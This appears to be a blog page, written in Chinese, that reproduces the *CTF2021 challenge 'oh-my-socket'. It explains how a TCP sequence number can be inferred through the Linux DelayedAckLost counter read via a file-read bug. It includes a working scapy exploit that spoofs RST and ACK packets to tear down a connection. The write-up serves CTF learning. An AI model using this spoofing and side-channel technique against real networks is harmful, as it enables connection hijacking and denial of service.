@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。
+审计题目 主办方公开了题目源码以及相关WP在他们的github上面
+https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket
+可以发现起了3个容器，分别是webserver，client和server。并且我们拥有：
+ webserver上的root权限RCE client里的任意文件读取  在启动的时候，client会绑定一个端口，然后通过tcp主动连接server的一个端口，然后两边互相等待，处于阻塞状态。只要连上了server的该端口，发送*ctf即可得到server的flag。
+所以问题就是断开client和server的链接。
+因为3个容器同属一个内网，所以我们控制的webserver可以伪装client或者server发送tcp包，因为原始TCP协议不会去验证MAC地址。只要我们向client或者server发送一个RST的TCP包那就可以断开他们的连接了，但是前提是sequence字段需要准确。
+所以本题预期解法的重点也就在于通过侧信道方式获取client中的sequence字段，这也是出题人设置了一个client的任意文件读取的意义。
+而在向client发送正确RST包以后，client就会close该链接，然后再向server发送一个rst包即可
+预期解 Linux中有一个计数器DelayedAckLost，当系统接收的数据包中的序列号小于预期的序列号时，则认为网络出了问题需要重传，所以这个计数器就加一，而且这个计数器是可以通过文件/proc/net/netstat或者其他的文件如proc/self/net/netstat读取到，所以我们可以通过这种办法来判断发送的序列号是否小于预期序列号，从而在(0, 2^32)的区间里推断出预期序列号。
+因此，采用二分法找出预期序列号即可进行后续攻击。
+另外在测试中可能会发现一个神奇的现象，就是有时采用2^32-1作为序列号的时候计数器居然加一了。这是因为TCP为解决序列号回绕问题，在判断序列号大小的时候不是直接seq1&amp;gt;seq2，而是
+/* * The next routines deal with comparing 32 bit unsigned ints * and worry about wraparound (automatic with unsigned arithmetic). */ static inline int before(__u32 seq1, __u32 seq2) { return (__s32)(seq1-seq2) &amp;lt; 0; } #define after(seq2, seq1) before(seq1, seq2) 如果2个无符号数seq1减去seq2的差值转换为有符号数后小于0，则证明seq1小于seq2。换句话说，当seq1 - seq2的值足够大，使得第一个bit为1时，那么就认为seq1小于seq2。
+这就会影响到我们通过DelayedAckLost来进行判断序列号大小，因为在这种判断逻辑下，系统会认为2^31&#43;x 小于 y (y &amp;lt; x &amp;lt; 2^31) 。这就会导致，在我们的预期程序逻辑中，'><title>*ctf2021 oh-my-socket 复现</title>
+
+<link rel='canonical' href='https://example.com/p/starctf2021-oh-my-socket/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='*ctf2021 oh-my-socket 复现'>
+<meta property='og:description' content='*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。
+审计题目 主办方公开了题目源码以及相关WP在他们的github上面
+https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket
+可以发现起了3个容器，分别是webserver，client和server。并且我们拥有：
+ webserver上的root权限RCE client里的任意文件读取  在启动的时候，client会绑定一个端口，然后通过tcp主动连接server的一个端口，然后两边互相等待，处于阻塞状态。只要连上了server的该端口，发送*ctf即可得到server的flag。
+所以问题就是断开client和server的链接。
+因为3个容器同属一个内网，所以我们控制的webserver可以伪装client或者server发送tcp包，因为原始TCP协议不会去验证MAC地址。只要我们向client或者server发送一个RST的TCP包那就可以断开他们的连接了，但是前提是sequence字段需要准确。
+所以本题预期解法的重点也就在于通过侧信道方式获取client中的sequence字段，这也是出题人设置了一个client的任意文件读取的意义。
+而在向client发送正确RST包以后，client就会close该链接，然后再向server发送一个rst包即可
+预期解 Linux中有一个计数器DelayedAckLost，当系统接收的数据包中的序列号小于预期的序列号时，则认为网络出了问题需要重传，所以这个计数器就加一，而且这个计数器是可以通过文件/proc/net/netstat或者其他的文件如proc/self/net/netstat读取到，所以我们可以通过这种办法来判断发送的序列号是否小于预期序列号，从而在(0, 2^32)的区间里推断出预期序列号。
+因此，采用二分法找出预期序列号即可进行后续攻击。
+另外在测试中可能会发现一个神奇的现象，就是有时采用2^32-1作为序列号的时候计数器居然加一了。这是因为TCP为解决序列号回绕问题，在判断序列号大小的时候不是直接seq1&amp;gt;seq2，而是
+/* * The next routines deal with comparing 32 bit unsigned ints * and worry about wraparound (automatic with unsigned arithmetic). */ static inline int before(__u32 seq1, __u32 seq2) { return (__s32)(seq1-seq2) &amp;lt; 0; } #define after(seq2, seq1) before(seq1, seq2) 如果2个无符号数seq1减去seq2的差值转换为有符号数后小于0，则证明seq1小于seq2。换句话说，当seq1 - seq2的值足够大，使得第一个bit为1时，那么就认为seq1小于seq2。
+这就会影响到我们通过DelayedAckLost来进行判断序列号大小，因为在这种判断逻辑下，系统会认为2^31&#43;x 小于 y (y &amp;lt; x &amp;lt; 2^31) 。这就会导致，在我们的预期程序逻辑中，'>
+<meta property='og:url' content='https://example.com/p/starctf2021-oh-my-socket/'>
+<meta property='og:site_name' content='Eifiz Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Web' /><meta property='article:published_time' content='2021-02-08T20:25:08&#43;00:00'/><meta property='article:modified_time' content='2021-02-08T20:25:08&#43;00:00'/>
+<meta name="twitter:title" content="*ctf2021 oh-my-socket 复现">
+<meta name="twitter:description" content="*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。
+审计题目 主办方公开了题目源码以及相关WP在他们的github上面
+https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket
+可以发现起了3个容器，分别是webserver，client和server。并且我们拥有：
+ webserver上的root权限RCE client里的任意文件读取  在启动的时候，client会绑定一个端口，然后通过tcp主动连接server的一个端口，然后两边互相等待，处于阻塞状态。只要连上了server的该端口，发送*ctf即可得到server的flag。
+所以问题就是断开client和server的链接。
+因为3个容器同属一个内网，所以我们控制的webserver可以伪装client或者server发送tcp包，因为原始TCP协议不会去验证MAC地址。只要我们向client或者server发送一个RST的TCP包那就可以断开他们的连接了，但是前提是sequence字段需要准确。
+所以本题预期解法的重点也就在于通过侧信道方式获取client中的sequence字段，这也是出题人设置了一个client的任意文件读取的意义。
+而在向client发送正确RST包以后，client就会close该链接，然后再向server发送一个rst包即可
+预期解 Linux中有一个计数器DelayedAckLost，当系统接收的数据包中的序列号小于预期的序列号时，则认为网络出了问题需要重传，所以这个计数器就加一，而且这个计数器是可以通过文件/proc/net/netstat或者其他的文件如proc/self/net/netstat读取到，所以我们可以通过这种办法来判断发送的序列号是否小于预期序列号，从而在(0, 2^32)的区间里推断出预期序列号。
+因此，采用二分法找出预期序列号即可进行后续攻击。
+另外在测试中可能会发现一个神奇的现象，就是有时采用2^32-1作为序列号的时候计数器居然加一了。这是因为TCP为解决序列号回绕问题，在判断序列号大小的时候不是直接seq1&amp;gt;seq2，而是
+/* * The next routines deal with comparing 32 bit unsigned ints * and worry about wraparound (automatic with unsigned arithmetic). */ static inline int before(__u32 seq1, __u32 seq2) { return (__s32)(seq1-seq2) &amp;lt; 0; } #define after(seq2, seq1) before(seq1, seq2) 如果2个无符号数seq1减去seq2的差值转换为有符号数后小于0，则证明seq1小于seq2。换句话说，当seq1 - seq2的值足够大，使得第一个bit为1时，那么就认为seq1小于seq2。
+这就会影响到我们通过DelayedAckLost来进行判断序列号大小，因为在这种判断逻辑下，系统会认为2^31&#43;x 小于 y (y &amp;lt; x &amp;lt; 2^31) 。这就会导致，在我们的预期程序逻辑中，">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="https://example.com" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" >
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/starctf2021-oh-my-socket/">*ctf2021 oh-my-socket 复现</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 08, 2021</time>
+            </div>
+        
+
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p>*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。</p>
+<!-- raw HTML omitted -->
+<h2 id="审计题目">审计题目</h2>
+<p>主办方公开了题目源码以及相关WP在他们的github上面</p>
+<p><a class="link" href="https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket"  target="_blank" rel="noopener"
+    >https://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket</a></p>
+<p>可以发现起了3个容器，分别是webserver，client和server。并且我们拥有：</p>
+<ul>
+<li>webserver上的root权限RCE</li>
+<li>client里的任意文件读取</li>
+</ul>
+<p>在启动的时候，client会绑定一个端口，然后通过tcp主动连接server的一个端口，然后两边互相等待，处于阻塞状态。只要连上了server的该端口，发送<code>*ctf</code>即可得到server的flag。</p>
+<p>所以问题就是断开client和server的链接。</p>
+<p>因为3个容器同属一个内网，所以我们控制的webserver可以伪装client或者server发送tcp包，因为原始TCP协议不会去验证MAC地址。只要我们向client或者server发送一个RST的TCP包那就可以断开他们的连接了，但是前提是sequence字段需要准确。</p>
+<p>所以本题预期解法的重点也就在于通过侧信道方式获取client中的sequence字段，这也是出题人设置了一个client的任意文件读取的意义。</p>
+<p>而在向client发送正确RST包以后，client就会close该链接，然后再向server发送一个rst包即可</p>
+<h2 id="预期解">预期解</h2>
+<p>Linux中有一个计数器DelayedAckLost，当系统接收的数据包中的序列号小于预期的序列号时，则认为网络出了问题需要重传，所以这个计数器就加一，而且这个计数器是可以通过文件<code>/proc/net/netstat</code>或者其他的文件如<code>proc/self/net/netstat</code>读取到，所以我们可以通过这种办法来判断发送的序列号是否小于预期序列号，从而在(0, 2^32)的区间里推断出预期序列号。</p>
+<p>因此，采用二分法找出预期序列号即可进行后续攻击。</p>
+<p>另外在测试中可能会发现一个神奇的现象，就是有时采用2^32-1作为序列号的时候计数器居然加一了。这是因为TCP为解决序列号回绕问题，在判断序列号大小的时候不是直接seq1&gt;seq2，而是</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm">* The next routines deal with comparing 32 bit unsigned ints
+</span><span class="cm">* and worry about wraparound (automatic with unsigned arithmetic).
+</span><span class="cm">*/</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">before</span><span class="p">(</span><span class="n">__u32</span> <span class="n">seq1</span><span class="p">,</span> <span class="n">__u32</span> <span class="n">seq2</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">return</span> <span class="p">(</span><span class="n">__s32</span><span class="p">)(</span><span class="n">seq1</span><span class="o">-</span><span class="n">seq2</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">#define after(seq2, seq1) before(seq1, seq2)
+</span></code></pre></div><p>如果2个无符号数seq1减去seq2的差值转换为有符号数后小于0，则证明seq1小于seq2。换句话说，当seq1 - seq2的值足够大，使得第一个bit为1时，那么就认为seq1小于seq2。</p>
+<p>这就会影响到我们通过DelayedAckLost来进行判断序列号大小，因为在这种判断逻辑下，系统会认为2^31+x 小于 y  (y &lt; x &lt; 2^31) 。这就会导致，在我们的预期程序逻辑中，</p>
+<ul>
+<li>当2^31+x为我们发送的seq1时，DelayedAckLost不正确的加一了</li>
+<li>当y为我们发送的seq1时，DelayedAckLost没有正确加一。</li>
+</ul>
+<p>但实际上我们采用二分查找法以后，很难出现2^31+x 与 y的比较，因为第一步比较就会将比较区间缩小到2^31之内了，不太可能出现这种横跨2^31的比较。</p>
+<p>获取到seq以后，即可发送rst包到client，此时client中的链接已被关闭。</p>
+<p>但是我们需要的是server上的链接关闭，所以我们伪造client向server发送一个ack包(seq值不正确)，根据TCP重传机制，server会返回一个ack包给到client，而client发现链接已经关闭，则会返回一个rst包（seq值为server发送的ack包的ack值），使得server上的链接也关闭。</p>
+<p>最后链接到server即可获取flag。</p>
+<p>附上EXP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">sendRstPacket</span><span class="p">(</span><span class="n">seq</span><span class="p">):</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="s2">&#34;172.21.0.2&#34;</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s2">&#34;172.21.0.3&#34;</span><span class="p">)</span>
+    <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">21587</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">7775</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;R&#34;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">seq</span><span class="p">)</span>
+    <span class="n">packet</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">/</span> <span class="n">tcp</span> 
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sendAckPacket</span><span class="p">(</span><span class="n">seq</span><span class="p">):</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="s2">&#34;172.21.0.2&#34;</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s2">&#34;172.21.0.3&#34;</span><span class="p">)</span>
+    <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">21587</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">7775</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">seq</span><span class="p">)</span>
+    <span class="n">packet</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">/</span> <span class="n">tcp</span> <span class="o">/</span> <span class="s2">&#34;payload&#34;</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sendAckPacketToServer</span><span class="p">(</span><span class="n">seq</span><span class="p">):</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="s2">&#34;172.21.0.3&#34;</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s2">&#34;172.21.0.2&#34;</span><span class="p">)</span>
+    <span class="n">tcp</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">7775</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">21587</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="n">seq</span><span class="p">)</span>
+    <span class="n">packet</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">/</span> <span class="n">tcp</span> <span class="o">/</span> <span class="s2">&#34;payload&#34;</span>
+    <span class="k">return</span> <span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">getDelayedAckLost</span><span class="p">():</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://172.21.0.3:5000/file?name=/proc/1/net/netstat&#34;</span><span class="p">)</span>
+    <span class="n">lines</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
+    <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
+    <span class="n">netstat</span> <span class="o">=</span> <span class="p">{</span><span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]:</span><span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">}</span>
+    <span class="k">return</span> <span class="n">netstat</span><span class="p">[</span><span class="s1">&#39;DelayedACKLost&#39;</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">binarySearch</span><span class="p">():</span>
+    <span class="nb">min</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="nb">max</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">32</span> <span class="o">-</span><span class="mi">1</span>
+    <span class="k">while</span> <span class="nb">abs</span><span class="p">(</span><span class="nb">max</span> <span class="o">-</span> <span class="nb">min</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">min</span> <span class="o">+</span> <span class="nb">max</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+        <span class="n">counter</span> <span class="o">=</span> <span class="n">getDelayedAckLost</span><span class="p">()</span>
+        <span class="n">sendAckPacket</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+        <span class="n">counter_new</span> <span class="o">=</span> <span class="n">getDelayedAckLost</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">counter_new</span> <span class="o">&gt;</span> <span class="n">counter</span><span class="p">:</span>
+            <span class="n">counter</span> <span class="o">=</span> <span class="n">counter_new</span>
+            <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
+    <span class="k">if</span> <span class="nb">min</span> <span class="o">==</span> <span class="nb">max</span> <span class="ow">or</span> <span class="nb">min</span> <span class="o">==</span> <span class="nb">max</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">min</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">None</span>
+        
+<span class="c1"># 有时获取到的seq并非正确的值，所以多试几次</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">seq</span> <span class="o">=</span> <span class="n">binarySearch</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>
+        <span class="c1"># 当获取到的seq为0时。证明上一次获取的值为正确的，也就是已经断开链接，所以break</span>
+        <span class="k">if</span> <span class="n">seq</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+            <span class="n">sendRstPacket</span><span class="p">(</span><span class="n">seq</span> <span class="o">+</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">50</span><span class="p">)</span>
+
+        <span class="n">sendAckPacketToServer</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="n">tcpCliSock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;172.21.0.2&#39;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">21587</span>
+<span class="n">ADDR</span> <span class="o">=</span> <span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
+<span class="n">tcpCliSock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">tcpCliSock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ADDR</span><span class="p">)</span>
+    <span class="n">tcpCliSock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;*ctf&#34;</span><span class="p">)</span>
+    <span class="n">data1</span> <span class="o">=</span> <span class="n">tcpCliSock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">data1</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+    <span class="n">tcpCliSock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">)</span>
+
+</code></pre></div><h2 id="题目非预期">题目非预期</h2>
+<ol>
+<li>一开始题目设置webserver为<code>privileged:true</code>导致docker逃逸，因此可以直接读到宿主机文件中另一个容器server中的flag。</li>
+<li>虽然client设置了depends_on，但这只能保证client会在server启动后再启动，无法保证在server.py执行以后再执行client.py。因此，依然有可能出现client中发起连接时server还未监听端口的情况，而client只发起一次connect，所以这会导致双方未建立链接，没有进入阻塞，这个时候直接连接server即可getflag。</li>
+<li>因为题目不是每个队伍一个环境，所以如果一直在connect server，那么有可能在别的队伍解除阻塞以后先人一步连上了server。。</li>
+</ol>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li>
+<p><a class="link" href="" >https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket</a></p>
+</li>
+<li>
+<p><a class="link" href="https://github.com/ateamjkr/posts/blob/30ee3cc41d9035409281913df4b881a08f4ceac7/ctf/starctf-oh-my-socket-solution.md"  target="_blank" rel="noopener"
+    >https://github.com/ateamjkr/posts/blob/30ee3cc41d9035409281913df4b881a08f4ceac7/ctf/starctf-oh-my-socket-solution.md</a></p>
+</li>
+<li>
+<p><a class="link" href="https://github.com/sixstars/starctf2021/blob/main/web-oh-my-socket/oh-my-socket-ZH.md"  target="_blank" rel="noopener"
+    >https://github.com/sixstars/starctf2021/blob/main/web-oh-my-socket/oh-my-socket-ZH.md</a></p>
+</li>
+<li>
+<p><a class="link" href="https://docs.docker.com/compose/startup-order/"  target="_blank" rel="noopener"
+    >https://docs.docker.com/compose/startup-order/</a></p>
+</li>
+</ol>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/a-trick-in-dom-xss/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">探索DOM XSS一个trick的原理</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/xnuca2019-hardjs-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XNUCA2019 Hardjs题解 从原型链污染到RCE</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="eifiz/eifiz.github.io"
+        issue-term="pathname"
+        
+        label="Comment"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Eifiz Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.1.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
